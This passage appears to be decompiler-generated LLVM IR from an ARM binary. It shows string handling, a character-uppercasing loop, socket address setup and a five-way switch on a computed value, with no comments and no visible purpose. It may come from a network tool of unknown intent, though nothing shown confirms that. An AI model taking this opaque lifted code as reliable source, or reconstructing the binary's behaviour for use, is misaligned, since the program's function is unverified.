  %v6_8200 = call i32 @function_9f84(i32 %v1_81d8, i32* %v5_8200, i32 21, i32 0, i32 %arg2)
  %v0_8204 = load i32, i32* @r5, align 4
  store i32 %v0_8204, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8210 = load i32, i32* @r4, align 4
  store i32 %v0_8210, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32), i32* %r3.global-to-local, align 4
  %v6_8218 = inttoptr i32 %v0_8204 to i32*
  %v7_8218 = call i32 @function_9f84(i32 %v0_8210, i32* %v6_8218, i32 20, i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32), i32 %v6_8200)
  %v0_821c = load i32, i32* @r5, align 4
  store i32 %v0_821c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8218, i32* %fp.global-to-local, align 4
  %v0_822c = load i32, i32* @r4, align 4
  store i32 %v0_822c, i32* %r0.global-to-local, align 4
  %v5_8230 = inttoptr i32 %v0_821c to i32*
  %v6_8230 = call i32 @function_9f84(i32 %v0_822c, i32* %v5_8230, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8234 = load i32, i32* @r5, align 4
  store i32 %v0_8234, i32* %r1.global-to-local, align 4
  store i32 %v6_8230, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8240 = load i32, i32* @r4, align 4
  store i32 %v0_8240, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_15f20.23 to i32), i32* %r3.global-to-local, align 4
  %v5_8248 = inttoptr i32 %v0_8234 to i32*
  %v6_8248 = call i32 @function_9f84(i32 %v0_8240, i32* %v5_8248, i32 22, i32 ptrtoint ([2 x i8]* @global_var_15f20.23 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_824c = load i32, i32* @r5, align 4
  store i32 %v0_824c, i32* %r1.global-to-local, align 4
  store i32 %v6_8248, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8258 = load i32, i32* @r4, align 4
  store i32 %v0_8258, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8260 = inttoptr i32 %v0_824c to i32*
  %v5_8260 = call i32 @function_a4e8(i32 %v0_8258, i32* %v4_8260, i32 24, i32 1)
  %v0_8264 = load i32, i32* @r5, align 4
  store i32 %v0_8264, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8260, i32* @r6, align 4
  %v0_8274 = load i32, i32* @r4, align 4
  store i32 %v0_8274, i32* %r0.global-to-local, align 4
  %v4_8278 = inttoptr i32 %v0_8264 to i32*
  %v5_8278 = call i32 @function_a4e8(i32 %v0_8274, i32* %v4_8278, i32 7, i32 80)
  %v2_8280 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8288 = mul i32 %v5_8278, 65536
  store i32 %v3_8288, i32* %r3.global-to-local, align 4
  %tmp199 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 10241, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_829c = urem i32 %v5_8278, 65536
  store i32 %v3_829c, i32* %r8.global-to-local, align 4
  %v3_82a0 = call i32 @function_13c90(i8* %tmp199, i32 0)
  store i32 %v3_82a0, i32* %r0.global-to-local, align 4
  %v0_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_82a4 = icmp slt i32 %v0_82a4, 0
  store i1 %v1_82a4, i1* %cpsr_n.global-to-local, align 1
  %v2_82a4 = icmp eq i32 %v0_82a4, 0
  store i1 %v2_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a4, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_81cc
  %v1_82a8 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_82a8 = icmp slt i32 %v1_82a8, 0
  store i1 %v2_82a8, i1* %cpsr_n.global-to-local, align 1
  %v3_82a8 = icmp eq i32 %v1_82a8, 0
  store i1 %v3_82a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a8, label %bb200, label %dec_label_pc_82c4

.thread13:                                        ; preds = %dec_label_pc_81cc
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b8

bb200:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b8

dec_label_pc_82b8:                                ; preds = %bb200, %dec_label_pc_82e4, %.thread13, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v29_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v3_82a0, %.thread13 ], [ %v3_82a0, %bb200 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  %v2_82c0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_82c0, i32* %r4.global-to-local, align 4
  store i32 %v6_81cc, i32* %r5.global-to-local, align 4
  store i32 %v9_81cc, i32* %r6.global-to-local, align 4
  store i32 %v15_81cc, i32* %r8.global-to-local, align 4
  ret i32 %v29_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a4, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a4 to i8*
  %v2_82c8 = call i32 @function_12c94(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v1_82cc = add i32 %v2_82c8, -255
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v3_82cc = sub i32 254, %v2_82c8
  %v4_82cc = and i32 %v3_82cc, %v2_82c8
  %v5_82cc = icmp slt i32 %v4_82cc, 0
  store i1 %v5_82cc, i1* %cpsr_v.global-to-local, align 1
  %v6_82cc = icmp slt i32 %v1_82cc, 0
  store i1 %v6_82cc, i1* %cpsr_n.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b8, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @function_12c94(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v1_82dc = add i32 %v2_82d8, -127
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v3_82dc = sub i32 126, %v2_82d8
  %v4_82dc = and i32 %v3_82dc, %v2_82d8
  %v5_82dc = icmp slt i32 %v4_82dc, 0
  store i1 %v5_82dc, i1* %cpsr_v.global-to-local, align 1
  %v6_82dc = icmp slt i32 %v1_82dc, 0
  store i1 %v6_82dc, i1* %cpsr_n.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b8, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @function_12c94(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v1_82ec = add i32 %v2_82e8, -9
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v3_82ec = sub i32 8, %v2_82e8
  %v4_82ec = and i32 %v3_82ec, %v2_82e8
  %v5_82ec = icmp slt i32 %v4_82ec, 0
  store i1 %v5_82ec, i1* %cpsr_v.global-to-local, align 1
  %v6_82ec = icmp slt i32 %v1_82ec, 0
  store i1 %v6_82ec, i1* %cpsr_n.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b8, label %bb201

bb201:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb201, %bb205
  %v0_82fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @function_12c94(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v2_830c = sub i32 %v2_8300, %v3_8308
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v4_830c = xor i32 %v3_8308, %v2_8300
  %v5_830c = xor i32 %v2_830c, %v2_8300
  %v6_830c = and i32 %v5_830c, %v4_830c
  %v7_830c = icmp slt i32 %v6_830c, 0
  store i1 %v7_830c, i1* %cpsr_v.global-to-local, align 1
  %v8_830c = icmp slt i32 %v2_830c, 0
  store i1 %v8_830c, i1* %cpsr_n.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* %fp.global-to-local, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v3_8320 = sub nsw i32 121, %v6_8314
  %v4_8320 = and i32 %v3_8320, %v1_831c
  %v5_8320 = icmp slt i32 %v4_8320, 0
  store i1 %v5_8320, i1* %cpsr_v.global-to-local, align 1
  %v6_8320 = icmp ult i8 %v4_8314, 122
  store i1 %v6_8320, i1* %cpsr_n.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb202, label %bb203

bb202:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_8314, %bb202
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb202 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb202 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb204, label %._crit_edge

._crit_edge:                                      ; preds = %bb203
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb205

bb204:                                            ; preds = %bb203
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %._crit_edge, %bb204
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb204 ]
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-40, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_1236c(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_1236c(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @function_1236c(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @function_1236c(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @function_1236c(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @function_1236c(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @function_1236c(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @function_1236c(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @function_1236c(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @function_1236c(i32 45)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v2_8390 = add i32 %v0_8390, -256
  %v3_8390 = icmp ugt i32 %v0_8390, 255
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v4_8390 = sub i32 255, %v0_8390
  %v5_8390 = and i32 %v4_8390, %v0_8390
  %v6_8390 = icmp slt i32 %v5_8390, 0
  store i1 %v6_8390, i1* %cpsr_v.global-to-local, align 1
  %v7_8390 = icmp slt i32 %v2_8390, 0
  store i1 %v7_8390, i1* %cpsr_n.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 256
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 256
  br i1 %v5_8394, label %thread-pre-split, label %bb206

bb206:                                            ; preds = %dec_label_pc_8340
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb206
  %v0_839c = phi i32 [ 256, %bb206 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @function_1236c(i32 46)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @function_14254(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_83b8 = icmp slt i32 %v0_839c, 0
  store i1 %v1_83b8, i1* %cpsr_n.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83b0, i32* @r5, align 4
  %tmp207 = icmp slt i32 %v0_839c, 1
  br i1 %tmp207, label %dec_label_pc_84f4, label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e70, %dec_label_pc_83c8
  %v1_83d8 = phi i32 [ %v1_9e8c, %dec_label_pc_9e70 ], [ %v2_83b0, %dec_label_pc_83c8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_81e4, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* @r7, align 4
  store i32 %v0_83e0, i32* %r0.global-to-local, align 4
  %v2_83e4 = call i32 @function_1347c(i32 %v0_83e0, i32 %v1_81e4)
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v2_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v2_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @sl, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @function_12cbc(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8418 = icmp ult i8 %v3_8414, 47
  store i1 %v6_8418, i1* %cpsr_n.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @function_12c94(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @function_13c80(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @function_12cbc(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @function_12cbc(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @function_12cbc(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8474 = icmp ult i8 %v3_8470, 31
  store i1 %v6_8474, i1* %cpsr_n.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c8, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @function_fe60()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8488 = and i32 %v0_8484, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_8488, i32* %r3.global-to-local, align 4
  %v1_8484 = udiv i32 %v0_8484, 256
  %v3_848c = and i32 %v1_8484, 65280
  store i32 %v3_848c, i32* %r2.global-to-local, align 4
  %v3_8490 = mul i32 %v0_8484, 16777216
  %v2_8494 = and i32 %v0_8484, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16777216)
  %v3_8494 = icmp ne i32 %v2_8494, 0
  store i1 %v3_8494, i1* %cpsr_c.global-to-local, align 1
  %v4_8494 = mul i32 %v1_8488, 256
  %v5_8494 = or i32 %v4_8494, %v3_8490
  store i32 %v5_8494, i32* %r1.global-to-local, align 4
  %v0_8498 = load i32, i32* @r6, align 4
  %v1_8498 = add i32 %v0_8498, 20
  %v2_8498 = inttoptr i32 %v1_8498 to i8*
  %v3_8498 = load i8, i8* %v2_8498, align 1
  %v4_8498 = zext i8 %v3_8498 to i32
  store i32 %v4_8498, i32* %ip.global-to-local, align 4
  %v4_849c = udiv i32 %v0_8484, 16777216
  %v5_849c = or i32 %v3_848c, %v4_849c
  %v2_84a0 = or i32 %v5_849c, %v5_8494
  %v7_84a4 = lshr i32 %v0_8480, %v4_8498
  %v8_84a4 = add i32 %v7_84a4, %v2_84a0
  store i32 %v8_84a4, i32* %r2.global-to-local, align 4
  %v3_84b0 = mul i32 %v8_84a4, 16777216
  %v1_84b4 = and i32 %v8_84a4, 65280
  store i32 %v1_84b4, i32* %r0.global-to-local, align 4
  %v4_84b8 = mul nuw nsw i32 %v1_84b4, 256
  %v5_84b8 = or i32 %v4_84b8, %v3_84b0
  store i32 %v5_84b8, i32* %r1.global-to-local, align 4
  %v2_84bc = and i32 %v8_84a4, 8388608
  %v3_84bc = icmp ne i32 %v2_84bc, 0
  store i1 %v3_84bc, i1* %cpsr_c.global-to-local, align 1
  %v2_84c0 = call i32 @llvm.bswap.i32(i32 %v8_84a4)
  store i32 %v2_84c0, i32* %r3.global-to-local, align 4
  %v1_84c4 = load i32, i32* @r5, align 4
  %v2_84c4 = add i32 %v1_84c4, 16
  %v3_84c4 = inttoptr i32 %v2_84c4 to i32*
  store i32 %v2_84c0, i32* %v3_84c4, align 4
  br label %dec_label_pc_84c8

dec_label_pc_84c8:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c8 = call i32 @function_fe60()
  store i32 %v0_84c8, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_84d0 = call i32 @function_133b0(i32 %v0_84c8, i32 5)
  store i32 %v2_84d0, i32* %r0.global-to-local, align 4
  %v1_84d4 = add i32 %v2_84d0, -4
  %v3_84d4 = sub i32 3, %v2_84d0
  %v4_84d4 = and i32 %v3_84d4, %v2_84d0
  %v5_84d4 = icmp slt i32 %v4_84d4, 0
  store i1 %v5_84d4, i1* %cpsr_v.global-to-local, align 1
  %v6_84d4 = icmp slt i32 %v1_84d4, 0
  store i1 %v6_84d4, i1* %cpsr_n.global-to-local, align 1
  %v7_84d4 = icmp eq i32 %v2_84d0, 4
  store i1 %v7_84d4, i1* %cpsr_z.global-to-local, align 1
  %v5_84d8 = and i32 %v2_84d0, 1073741824
  %v6_84d8 = icmp ne i32 %v5_84d8, 0
  store i1 %v6_84d8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d0, label %dec_label_pc_9e70 [
    i32 0, label %dec_label_pc_9ed4
    i32 1, label %dec_label_pc_9f00
    i32 2, label %dec_label_pc_9f2c
    i32 3, label %dec_label_pc_9f58
    i32 4, label %dec_label_pc_9e48
  ]

dec_label_pc_84f4:                                ; preds = %thread-pre-split
  %v1_84f8 = add i32 %v2_83b0, 1456
  %v0_8500 = load i32, i32* %r8.global-to-local, align 4
  %v1_8500 = urem i32 %v0_8500, 256
  store i32 %v1_8500, i32* %r3.global-to-local, align 4
  %v1_8504 = add i32 %v2_83b0, 1464
  store i32 %v1_8504, i32* %r1.global-to-local, align 4
  %v2_8508 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_8508, i32* %r2.global-to-local, align 4
  store i32 %v1_84f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_8528.preheader

dec_label_pc_8528.preheader:                      ; preds = %dec_label_pc_84f4, %dec_label_pc_9e94
  %storemerge148.in.in = phi i32 [ %v0_9ea8, %dec_label_pc_9e94 ], [ %v0_8500, %dec_label_pc_84f4 ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_9ea0, %dec_label_pc_9e94 ], [ %v1_84f8, %dec_label_pc_84f4 ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_9ea8, %dec_label_pc_9e94 ], [ %v1_8500, %dec_label_pc_84f4 ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9eac, %dec_label_pc_9e94 ], [ %v1_8504, %dec_label_pc_84f4 ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_9eb0, %dec_label_pc_9e94 ], [ %v2_8508, %dec_label_pc_84f4 ]
  %storemerge148.in = and i32 %storemerge148.in.in, 128
  %storemerge148 = icmp ne i32 %storemerge148.in, 0
  store i1 %storemerge148, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = udiv i32 %storemerge148.in.in, 256
  store i32 %v3_9eb8, i32* %r8.global-to-local, align 4
  %v4_8590 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_86d0 = ptrtoint i32* %stack_var_-148 to i32
  %v2_86e8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_8728 = ptrtoint i32* %stack_var_-72 to i32
  %v3_8734 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v2_8748 = ptrtoint i32* %stack_var_-36 to i32
  %v1_8940 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_8c94 = icmp slt i32 %v6_8200, 0
  %v2_8c94 = icmp eq i32 %v6_8200, 0
  %v4_8ce8 = inttoptr i32 %stack_var_-20856.0.ph to i32*
  %v1_8b90 = inttoptr i32 %v6_8200 to i8*
  %v2_87b4 = ptrtoint i32* %stack_var_-56 to i32
